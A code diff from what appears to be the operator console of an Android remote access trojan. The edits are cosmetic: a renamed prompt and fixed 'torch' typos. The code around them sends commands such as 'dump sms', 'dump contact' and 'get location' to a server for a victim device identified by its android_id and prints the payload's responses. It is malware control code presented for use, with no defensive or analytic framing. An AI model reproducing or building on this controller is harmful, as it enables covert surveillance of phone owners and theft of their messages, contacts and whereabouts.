@@ -126,7 +126,7 @@ def level_one_operation(cmd, android_id) :
 def select_command(android_id, device_addr) :
     while True :
           print()
-          command = input("seroxil# ")
+          command = input("vorex# ")
           print()
           if command == "dump sms" :
              level_two_operation("3416", android_id)
@@ -144,11 +144,11 @@ def select_command(android_id, device_addr) :
                level_two_operation("9263", android_id)
           elif command == "dump contact" :
                level_two_operation("3871", android_id)
-          elif command == "turch off" :
+          elif command == "torch off" :
                level_one_operation("2432", android_id)
           elif command == "get location" :
                level_one_operation("2592", android_id)
-          elif  command == "turch on" :
+          elif  command == "torch on" :
              req = r.post(f"{server}/command/{android_id}/2713", data=password)
              response = get_response(android_id)
              print(f"Response from payload:{response}")
